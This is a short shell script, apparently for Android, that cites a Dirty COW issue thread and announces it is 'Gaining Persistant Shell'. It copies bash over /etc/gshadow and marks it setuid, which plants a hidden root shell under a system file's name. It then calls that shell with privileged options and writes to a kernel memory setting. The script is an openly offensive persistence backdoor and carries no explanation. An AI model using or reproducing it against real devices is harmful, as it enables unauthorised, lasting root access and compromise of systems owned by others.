#!/system/bin/sh

# Source:
# https://github.com/dirtycow/dirtycow.github.io/issues/25#issuecomment-255936948

echo "Gaining Persistant Shell...."
echo ""
echo ""

cp /bin/bash /etc/gshadow && chmod 04755 /etc/gshadow
exit
/etc/gshadow -ipc 'echo 0 > /proc/sys/vm/dirty_writeback_centisecs'
/etc/gshadow -ip